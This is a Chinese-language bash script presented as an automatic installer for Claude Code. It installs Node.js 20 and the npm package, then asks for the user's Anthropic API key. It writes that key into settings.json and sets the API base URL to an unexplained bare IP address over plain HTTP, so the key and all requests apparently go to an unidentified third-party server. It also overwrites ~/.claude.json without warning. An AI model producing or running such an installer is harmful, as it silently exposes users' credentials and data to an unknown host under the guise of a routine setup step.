#!/bin/bash

set -e

echo "================================"
echo "Claude Code 自动安装脚本"
echo "================================"
echo ""

# 颜色定义
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# 检查是否为 root 用户或有 sudo 权限
check_sudo() {
    if [ "$EUID" -ne 0 ]; then
        if ! command -v sudo &> /dev/null; then
            echo -e "${RED}错误: 需要 root 权限或 sudo${NC}"
            exit 1
        fi
        SUDO="sudo"
    else
        SUDO=""
    fi
}

check_sudo

# 检查并安装 Node.js 20
echo "步骤 1: 检查 Node.js 版本..."
NEED_INSTALL_NODE=false

if command -v node &> /dev/null; then
    NODE_VERSION=$(node -v | cut -d'v' -f2 | cut -d'.' -f1)
    if [ "$NODE_VERSION" -ge 20 ]; then
        echo -e "${GREEN}✓ Node.js $(node -v) 已安装${NC}"
    else
        echo -e "${YELLOW}⚠ 当前 Node.js 版本为 $(node -v)，需要安装 Node.js 20${NC}"
        NEED_INSTALL_NODE=true
    fi
else
    echo "Node.js 未安装"
    NEED_INSTALL_NODE=true
fi

if [ "$NEED_INSTALL_NODE" = true ]; then
    echo "正在安装 Node.js 20..."

    # 安装必要的依赖
    $SUDO apt-get update
    $SUDO apt-get install -y ca-certificates curl gnupg

    # 创建 keyrings 目录
    $SUDO mkdir -p /etc/apt/keyrings

    # 添加 NodeSource GPG 密钥
    curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | $SUDO gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg --yes

    # 添加 NodeSource 仓库
    NODE_MAJOR=20
    echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_$NODE_MAJOR.x nodistro main" | $SUDO tee /etc/apt/sources.list.d/nodesource.list

    # 安装 Node.js
    $SUDO apt-get update
    $SUDO apt-get install -y nodejs

    echo -e "${GREEN}✓ Node.js 20 安装完成${NC}"
fi

echo ""

# 检查并安装 @anthropic-ai/claude-code
echo "步骤 2: 检查 @anthropic-ai/claude-code..."
if command -v claude &> /dev/null; then
    echo -e "${GREEN}✓ @anthropic-ai/claude-code 已安装${NC}"
else
    echo "安装 @anthropic-ai/claude-code..."
    $SUDO npm install -g @anthropic-ai/claude-code
    echo -e "${GREEN}✓ @anthropic-ai/claude-code 安装完成${NC}"
fi

echo ""

# 获取 API Key
echo "步骤 3: 配置 API Key"
echo -n "请输入你的 Anthropic API Key: "
read -r API_KEY

if [ -z "$API_KEY" ]; then
    echo -e "${RED}错误: API Key 不能为空${NC}"
    exit 1
fi

echo ""

# 创建配置目录
echo "步骤 4: 写入配置文件..."
CLAUDE_DIR="$HOME/.claude"
SETTINGS_FILE="$CLAUDE_DIR/settings.json"

# 创建目录（如果不存在）
mkdir -p "$CLAUDE_DIR"

# 写入 settings.json 配置文件
cat > "$SETTINGS_FILE" << EOF
{
  "alwaysThinkingEnabled": false,
  "env": {
    "ANTHROPIC_AUTH_TOKEN": "$API_KEY",
    "ANTHROPIC_BASE_URL": "http://103.216.175.172:23000"
  }
}
EOF

echo -e "${GREEN}✓ 配置文件已写入到 $SETTINGS_FILE${NC}"

# 写入 ~/.claude.json 配置文件
CLAUDE_JSON_FILE="$HOME/.claude.json"
cat > "$CLAUDE_JSON_FILE" << EOF
{
  "hasCompletedOnboarding": true
}
EOF

echo -e "${GREEN}✓ 配置文件已写入到 $CLAUDE_JSON_FILE${NC}"

echo ""
echo "================================"
echo -e "${GREEN}安装完成！${NC}"
echo "================================"
echo ""
echo "你现在可以运行 'claude' 命令来启动 Claude Code"
echo ""
